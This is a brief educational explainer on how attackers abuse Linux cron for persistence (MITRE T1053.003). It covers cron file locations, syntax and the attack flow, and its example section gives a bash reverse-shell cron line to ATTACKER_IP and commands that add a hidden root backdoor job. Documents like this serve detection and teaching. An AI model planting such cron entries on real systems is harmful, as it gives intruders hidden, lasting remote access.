# Cron Jobs Persistence

## Overview

Cron is a time-based job scheduler in Linux used to automate repetitive tasks. It is a native system utility that executes commands or scripts at fixed intervals or specific times.

Attackers frequently abuse cron to maintain persistence because it runs automatically in the background without user interaction and survives system reboots.

---

## How It Works

The cron daemon (`crond`) continuously runs in the background and checks scheduled jobs defined in:

* user crontabs
* system-wide cron directories
* `/etc/crontab`

When a scheduled time matches, cron executes the associated command or script with the privileges of the user who defined it.

Persistence is achieved by inserting malicious commands into cron configurations so they execute repeatedly or at system startup.

---

## Common Cron Locations

### User Crontabs

```text
/var/spool/cron/crontabs/<user>
```

Accessed via:

```bash
crontab -e
crontab -l
```

---

### System-Wide Cron File

```text
/etc/crontab
```

Allows specification of user context for execution.

---

### Cron Directories

```text
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/
```

Scripts placed in these directories are executed automatically based on their schedule.

---

## Cron Syntax

```text
* * * * * /path/to/command
│ │ │ │ │
│ │ │ │ └── Day of week (0–7)
│ │ │ └──── Month (1–12)
│ │ └────── Day of month (1–31)
│ └──────── Hour (0–23)
└────────── Minute (0–59)
```

---

## Persistence Flow

```text
Attacker Gains Access
        │
        ▼
Modify Crontab or System Cron File
        │
        ▼
Cron Daemon Monitors Schedule
        │
        ▼
Scheduled Time Triggered
        │
        ▼
Malicious Command Executes
        │
        ▼
Persistent Access Maintained
```

---

## Example (Malicious Cron Job)

### User-Level Persistence

```bash
crontab -e
```

```text
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

### System-Wide Persistence

```bash
echo '*/10 * * * * root /usr/bin/python3 /tmp/backdoor.py' >> /etc/crontab
```

---

### Hidden Cron File

```bash
echo '* * * * * root /tmp/.hidden.sh' > /etc/cron.d/.update
```

---

## Related MITRE ATT&CK Technique

**T1053.003 – Scheduled Task/Job: Cron**

---

## Summary

Cron jobs are one of the simplest and most reliable Linux persistence mechanisms. Because they are deeply integrated into the operating system and often overlooked during monitoring, they provide attackers with a stealthy way to maintain long-term access. Effective detection requires continuous auditing of cron configurations and scheduled tasks.
